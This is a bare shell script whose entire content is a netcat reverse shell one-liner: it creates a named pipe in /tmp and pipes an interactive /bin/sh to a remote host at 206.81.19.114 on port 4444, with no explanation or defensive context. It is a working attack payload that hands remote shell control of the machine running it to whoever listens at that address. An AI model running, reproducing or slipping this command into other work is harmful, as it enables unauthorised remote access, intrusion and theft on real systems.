#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 206.81.19.114 4444 >/tmp/f
